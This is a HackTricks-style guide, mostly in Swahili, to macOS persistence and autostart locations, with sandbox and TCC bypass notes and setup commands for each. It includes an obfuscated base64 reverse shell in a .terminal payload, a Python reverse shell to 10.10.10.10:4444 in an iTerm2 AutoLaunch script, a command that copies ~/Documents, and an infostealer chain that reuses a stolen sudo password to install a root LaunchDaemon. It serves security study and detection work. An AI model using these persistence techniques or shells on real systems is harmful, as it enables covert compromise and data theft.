# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Sehemu hii inategemea kwa kiasi kikubwa mfululizo wa blogu [**Beyond the good ol. LaunchAgents**](https://theevilbit.github.io/beyond/), lengo likiwa kuongeza **Autostart Locations** zaidi (ikiwezekana), kuonyesha **ni techniques zipi bado zinafanya kazi** siku hizi katika toleo jipya zaidi la macOS (13.4), na kubainisha **permissions** zinazohitajika.

## Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzisha yanayofaa kwa **sandbox bypass**, yanayokuruhusu kutekeleza kitu kwa urahisi kwa **kukiandika kwenye faili** na **kusubiri** **action** ya kawaida sana, **muda maalum** au **action unayoweza kwa kawaida kufanya** ukiwa ndani ya sandbox bila kuhitaji root permissions.

### Launchd

- Inafaa kwa sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root inahitajika
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root inahitajika
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root inahitajika
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root inahitajika
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> Kama jambo la kuvutia, **`launchd`** ina property list iliyopachikwa katika sehemu ya Mach-o `__Text.__config`, ambayo ina services nyingine zinazojulikana ambazo launchd lazima ianzishe. Zaidi ya hayo, services hizi zinaweza kuwa na `RequireSuccess`, `RequireRun` na `RebootOnSuccess`, kumaanisha kwamba lazima ziendeshwe na zikamilike kwa mafanikio.
>
> Bila shaka, haiwezi kurekebishwa kwa sababu ya code signing.

#### Maelezo na Exploitation

**`launchd`** ndiyo **process** ya kwanza kutekelezwa na kernel ya OX S wakati wa kuanza na ya mwisho kumaliza wakati wa kuzima. Inapaswa daima kuwa na **PID 1**. Process hii **itasoma na kutekeleza** configurations zilizoonyeshwa katika **ASEP** **plists** zilizopo kwenye:

- `/Library/LaunchAgents`: Per-user agents zilizosakinishwa na admin
- `/Library/LaunchDaemons`: System-wide daemons zilizosakinishwa na admin
- `/System/Library/LaunchAgents`: Per-user agents zinazotolewa na Apple.
- `/System/Library/LaunchDaemons`: System-wide daemons zinazotolewa na Apple.

Mtumiaji anapoingia, plists zilizopo kwenye `/Users/$USER/Library/LaunchAgents` na `/Users/$USER/Library/LaunchDemons` huanzishwa kwa **permissions za mtumiaji aliyeingia**.

**Tofauti kuu kati ya agents na daemons ni kwamba agents hupakiwa mtumiaji anapoingia, na daemons hupakiwa wakati wa kuanza kwa mfumo** (kwa kuwa kuna services kama ssh zinazohitaji kutekelezwa kabla mtumiaji yeyote hajafikia mfumo). Pia agents zinaweza kutumia GUI, huku daemons zikihitaji kuendeshwa chinichini.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Kuna hali ambapo **agent inahitaji kutekelezwa kabla ya user kuingia**, hizi huitwa **PreLoginAgents**. Kwa mfano, hii ni muhimu ili kutoa teknolojia saidizi wakati wa kuingia. Pia zinaweza kupatikana katika `/Library/LaunchAgents` (tazama [**hapa**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) kwa mfano).

> [!TIP]
> Faili mpya za usanidi wa Daemons au Agents **zitapakiwa baada ya kuwasha upya au kwa kutumia** `launchctl load <target.plist>` Pia **inawezekana kupakia faili za .plist zisizo na kiendelezi hicho** kwa kutumia `launchctl -F <file>` (hata hivyo, faili hizo za plist hazitapakiwa kiotomatiki baada ya kuwasha upya).\
> Pia inawezekana **kuondoa upakiaji** kwa kutumia `launchctl unload <target.plist>` (process iliyoelekezwa na faili hiyo itasitishwa),
>
> Ili **kuhakikisha** kwamba hakuna **kitu chochote** (kama override) **kinachozuia** **Agent** au **Daemon** **kutekelezwa**, endesha: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Orodhesha agents na daemons zote zilizopakiwa na user wa sasa:
```bash
launchctl list
```
#### Mfano wa malicious LaunchDaemon chain (password reuse)

macOS infostealer ya hivi karibuni ilitumia tena **captured sudo password** kuweka user agent na root LaunchDaemon:<sup>[[1]](#references)</sup>

- Andika agent loop kwenye `~/.agent` na uifanye iwe executable.
- Generate plist kwenye `/tmp/starter` inayoelekeza kwenye agent hiyo.
- Tumia tena stolen password na `sudo -S` kuinakili hadi `/Library/LaunchDaemons/com.finder.helper.plist`, weka `root:wheel`, kisha ipakie kwa `launchctl load`.
- Anzisha agent kimya kupitia `nohup ~/.agent >/dev/null 2>&1 &` ili kutenganisha output.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Ikiwa plist inamilikiwa na mtumiaji, hata ikiwa iko kwenye mafolda ya daemon ya mfumo mzima, **task itatekelezwa kama mtumiaji** na si kama root. Hili linaweza kuzuia baadhi ya mashambulizi ya privilege escalation.

#### Maelezo zaidi kuhusu launchd

**`launchd`** ni mchakato wa kwanza wa **user mode** unaoanzishwa kutoka kwenye **kernel**. Uanzishaji wa mchakato lazima **ufaulu** na mchakato huo **hauwezi kutoka au ku-crash**. Pia **umelindwa** dhidi ya baadhi ya **killing signals**.

Mojawapo ya mambo ya kwanza ambayo `launchd` hufanya ni **kuanzisha** **daemons** wote kama vile:

- **Timer daemons** kulingana na muda wa kutekelezwa:
- atd (`com.apple.atrun.plist`): Ina `StartInterval` ya dakika 30
- crond (`com.apple.systemstats.daily.plist`): Ina `StartCalendarInterval` ya kuanza saa 00:15
- **Network daemons** kama:
- `org.cups.cups-lpd`: Husikiliza TCP (`SockType: stream`) kwa `SockServiceName: printer`
- SockServiceName lazima iwe port au service kutoka `/etc/services`
- `com.apple.xscertd.plist`: Husikiliza TCP kwenye port 1640
- **Path daemons** zinazotekelezwa path iliyobainishwa inapobadilika:
- `com.apple.postfix.master`: Hukagua path `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Inaonyesha kwenye entry ya `MachServices` jina `com.apple.xscertd.helper`
- **UserEventAgent:**
- Hii ni tofauti na ya awali. Hufanya launchd i-spawn apps ikijibu event maalum. Hata hivyo, katika hali hii, binary kuu inayohusika si `launchd` bali `/usr/libexec/UserEventAgent`. Hupakia plugins kutoka kwenye folder iliyozuiwa na SIP `/System/Library/UserEventPlugins/`, ambapo kila plugin huonyesha initialiser yake kwenye key ya `XPCEventModuleInitializer` au, kwa plugins za zamani, kwenye dict ya `CFPluginFactories` chini ya key `FB86416D-6164-2070-726F-70735C216EC0` ya `Info.plist` yake.

### mafaili ya kuanzisha shell

Maelezo: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Maelezo (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kupata app yenye TCC bypass inayotekeleza shell inayopakia mafaili haya

#### Mahali

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Fungua terminal yenye zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Fungua terminal yenye zsh
- Root inahitajika
- **`~/.zlogout`**
- **Trigger**: Funga terminal yenye zsh
- **`/etc/zlogout`**
- **Trigger**: Funga terminal yenye zsh
- Root inahitajika
- Huenda kuna zaidi kwenye: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Fungua terminal yenye bash
- `/etc/profile` (haikufanya kazi)
- `~/.profile` (haikufanya kazi)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Inatarajiwa ku-trigger na xterm, lakini **haijasakinishwa**, na hata baada ya kusakinishwa error hii hutokea: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Maelezo na Exploitation

Wakati wa kuanzisha mazingira ya shell kama `zsh` au `bash`, **mafaili fulani ya kuanzisha huendeshwa**. Kwa sasa macOS hutumia `/bin/zsh` kama shell ya default. Shell hii hufikiwa kiotomatiki programu ya Terminal inapozinduliwa au kifaa kinapofikiwa kupitia SSH. Ingawa `bash` na `sh` pia zipo kwenye macOS, zinahitaji kuitishwa wazi ili zitumike.<sup>[[2]](#references)</sup>

Ukurasa wa man wa zsh, ambao tunaweza kuusoma kwa **`man zsh`**, una maelezo marefu kuhusu mafaili ya kuanzisha.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Programu Zilizofunguliwa Tena

> [!CAUTION]
> Kuweka exploitation iliyoonyeshwa na kutoka kisha kuingia tena, au hata kuwasha upya, hakukuendesha app katika majaribio. Huenda app inahitaji kuwa inaendeshwa wakati vitendo hivi vinapofanywa.

**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Kichochezi**: Kuanzisha upya hufungua tena applications

#### Maelezo na Exploitation

Applications zote za kufunguliwa tena ziko ndani ya plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Kwa hiyo, ili kufanya applications za kufunguliwa tena zianzishe app yako, unahitaji tu **kuongeza app yako kwenye orodha**.

UUID inaweza kupatikana kwa kuorodhesha directory hiyo au kwa kutumia `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Ili kuangalia applications zitakazofunguliwa tena, unaweza kufanya:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Ili **kuongeza programu kwenye orodha hii** unaweza kutumia:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal hutumia kuwa na ruhusa za FDA za mtumiaji anayeitumia

#### Mahali

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Fungua Terminal

#### Maelezo na Exploitation

Katika **`~/Library/Preferences`** huhifadhiwa mapendeleo ya mtumiaji katika Applications. Baadhi ya mapendeleo haya yanaweza kuwa na configuration ya **execute applications/scripts** nyingine.<sup>[[5]](#references)</sup>

Kwa mfano, Terminal inaweza execute command wakati wa Startup:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Configuration hii inaonyeshwa katika file **`~/Library/Preferences/com.apple.Terminal.plist`** kama ifuatavyo:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Kwa hivyo, ikiwa plist ya mapendeleo ya terminal kwenye system inaweza kuandikwa upya, utendaji wa **`open`** unaweza kutumika **kufungua terminal na amri hiyo itatekelezwa**.

Unaweza kuongeza hii kutoka kwenye CLI kwa:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Kutumia Terminal ili kupata ruhusa za FDA za mtumiaji anayeitumia

#### Location

- **Mahali popote**
- **Trigger**: Fungua Terminal

#### Description & Exploitation

Ukiunda script ya [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) na kuifungua, **Terminal application** itafunguliwa kiotomatiki ili kutekeleza commands zilizoainishwa ndani yake. Ikiwa Terminal app ina privileges maalum (kama vile TCC), command yako itaendeshwa kwa privileges hizo maalum.

Ijaribu kwa:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Unaweza pia kutumia viendelezi **`.command`**, **`.tool`**, vyenye maudhui ya kawaida ya shell scripts, na pia vitafunguliwa na Terminal.

> [!CAUTION]
> Ikiwa Terminal ina **Full Disk Access**, itaweza kukamilisha kitendo hicho (kumbuka kwamba command iliyotekelezwa itaonekana kwenye dirisha la terminal).

### Audio Plugins

Maelezo: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Maelezo: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Yanafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Huenda ukapata ufikiaji wa ziada wa TCC

#### Mahali

- **`/Library/Audio/Plug-Ins/HAL`**
- Root inahitajika
- **Trigger**: Anzisha upya coreaudiod au computer
- **`/Library/Audio/Plug-ins/Components`**
- Root inahitajika
- **Trigger**: Anzisha upya coreaudiod au computer
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Anzisha upya coreaudiod au computer
- **`/System/Library/Components`**
- Root inahitajika
- **Trigger**: Anzisha upya coreaudiod au computer

#### Maelezo

Kulingana na maelezo ya awali, inawezekana **kucompile baadhi ya audio plugins** na kuzifanya zipakiwe.<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook Plugins

Maelezo: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Yanafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Huenda ukapata ufikiaji wa ziada wa TCC

#### Mahali

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Maelezo na Exploitation

QuickLook plugins zinaweza kutekelezwa unapofanya **preview ya file** (bonyeza space bar huku file likiwa limechaguliwa kwenye Finder) na **plugin inayotumia aina hiyo ya file** ikiwa imesakinishwa.<sup>[[8]](#references)</sup>

Inawezekana kucompile QuickLook plugin yako mwenyewe, kuiweka katika mojawapo ya maeneo yaliyotajwa hapo awali ili ipakiwe, kisha uende kwenye file linalotumika na ubonyeze space ili kui-trigger.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Hili halikufanya kazi kwangu, si kwa user LoginHook wala kwa root LogoutHook

**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Yanafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Unahitaji kuwa na uwezo wa kutekeleza kitu kama `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Iko katika `~/Library/Preferences/com.apple.loginwindow.plist`

Zimepitwa na wakati, lakini zinaweza kutumika kutekeleza commands user anapoingia.<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Mpangilio huu huhifadhiwa katika `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Ili kuifuta:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Mtumiaji root huhifadhiwa katika **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzisha yanayofaa kwa **sandbox bypass**, yanayokuruhusu kutekeleza kitu kwa urahisi kwa **kukiiandika kwenye faili** na **kutegemea hali zisizo za kawaida sana**, kama vile **programu maalum zilizowekwa, vitendo vya mtumiaji "visivyo vya kawaida"** au mazingira.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Inafaa kwa sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Hata hivyo, lazima uweze kutekeleza `crontab` binary
- Au uwe root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root inahitajika kwa ufikiaji wa moja kwa moja wa kuandika. Root haihitajiki ikiwa unaweza kutekeleza `crontab <file>`
- **Trigger**: Inategemea cron job

#### Description & Exploitation

Orodhesha cron jobs za **mtumiaji wa sasa** kwa:
```bash
crontab -l
```
Unaweza pia kuona cron jobs zote za users katika **`/usr/lib/cron/tabs/`** na **`/var/at/tabs/`** (inahitajika root).

Katika MacOS, folders kadhaa zinazoendesha scripts kwa **frequency fulani** zinaweza kupatikana katika:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Hapo unaweza kupata **cron** **jobs** za kawaida, **at** **jobs** (hazitumiki sana) na **periodic** **jobs** (hutumiwa hasa kusafisha faili za muda). **periodic jobs** za kila siku zinaweza kutekelezwa kwa mfano kwa: `periodic daily`.<sup>[[10]](#references)</sup>

Ili kuongeza **user cronjob programmatically**, inawezekana kutumia:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 ilikuwa na TCC permissions zilizotolewa

#### Maeneo

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Kichocheo**: Fungua iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Kichocheo**: Fungua iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Kichocheo**: Fungua iTerm

#### Maelezo na Exploitation

Scripts zilizohifadhiwa katika **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** zitatekelezwa. Kwa mfano:<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
au:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** pia itatekelezwa:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Mapendeleo ya iTerm2 yaliyo katika **`~/Library/Preferences/com.googlecode.iterm2.plist`** yanaweza **kubainisha amri ya kutekelezwa** terminali ya iTerm2 inapofunguliwa.

Mpangilio huu unaweza kusanidiwa katika mipangilio ya iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Na amri hiyo huonekana katika mapendeleo:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Unaweza kuweka amri itakayotekelezwa kwa:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Kuna uwezekano mkubwa wa kuwepo **njia nyingine za kutumia vibaya iTerm2 preferences** kutekeleza arbitrary commands.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Ni muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini xbar lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Huomba Accessibility permissions

#### Mahali

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Kichochezi**: Mara tu xbar inapotekelezwa

#### Maelezo

Ikiwa programu maarufu ya [**xbar**](https://github.com/matryer/xbar) imesakinishwa, inawezekana kuandika shell script katika **`~/Library/Application\ Support/xbar/plugins/`** ambayo itatekelezwa xbar inapoanzishwa:<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini Hammerspoon lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Huomba ruhusa za Accessibility

#### Mahali

- **`~/.hammerspoon/init.lua`**
- **Kichochezi**: Hammerspoon inapotekelezwa

#### Maelezo

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) hutumika kama jukwaa la automation kwa **macOS**, likitumia **lugha ya scripting ya LUA** kwa uendeshaji wake. Muhimu zaidi, linaunga mkono ujumuishaji wa code kamili ya AppleScript na utekelezaji wa shell scripts, hivyo kuimarisha kwa kiasi kikubwa uwezo wake wa scripting.<sup>[[13]](#references)</sup>

Programu hutafuta faili moja, `~/.hammerspoon/init.lua`, na inapoanzishwa script hiyo itatekelezwa.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini BetterTouchTool lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Inaomba ruhusa za Automation-Shortcuts na Accessibility

#### Mahali

- `~/Library/Application Support/BetterTouchTool/*`

Tool hii inaruhusu kubainisha applications au scripts za kutekelezwa wakati shortcuts fulani zinapobonyezwa. Mshambulizi anaweza kuweza kusanidi **shortcut na action yake ya kutekelezwa katika database** ili iweze kutekeleza arbitrary code (shortcut inaweza kuwa kubonyeza key moja tu).

### Alfred

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini Alfred lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Inaomba ruhusa za Automation, Accessibility na hata Full-Disk access

#### Mahali

- `???`

Inaruhusu kuunda workflows zinazoweza kutekeleza code masharti fulani yanapotimizwa. Kinadharia, mshambulizi anaweza kuunda workflow file na kuifanya Alfred ipakie file hiyo (inahitaji kulipia premium version ili kutumia workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini ssh lazima iwe imewezeshwa na itumike
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH hutumia kuwa na FDA access

#### Mahali

- **`~/.ssh/rc`**
- **Trigger**: Kuingia kupitia ssh
- **`/etc/ssh/sshrc`**
- Root inahitajika
- **Trigger**: Kuingia kupitia ssh

> [!CAUTION]
> Kuwasha ssh kunahitaji Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Maelezo na Exploitation

Kwa default, isipokuwa `PermitUserRC no` iwe katika `/etc/ssh/sshd_config`, mtumiaji **anapoingia kupitia SSH** scripts **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zitatekelezwa.<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kutekeleza `osascript` yenye args
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Maeneo

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Kuingia
- Exploit payload huhifadhiwa ikiiita **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Kuingia
- Root inahitajika

#### Maelezo

Katika System Preferences -> Users & Groups -> **Login Items** unaweza kupata **items za kutekelezwa mtumiaji anapoingia**.\
Inawezekana kuziorodhesha, kuziongeza na kuziondoa kutoka kwenye command line:<sup>[[15]](#references)</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
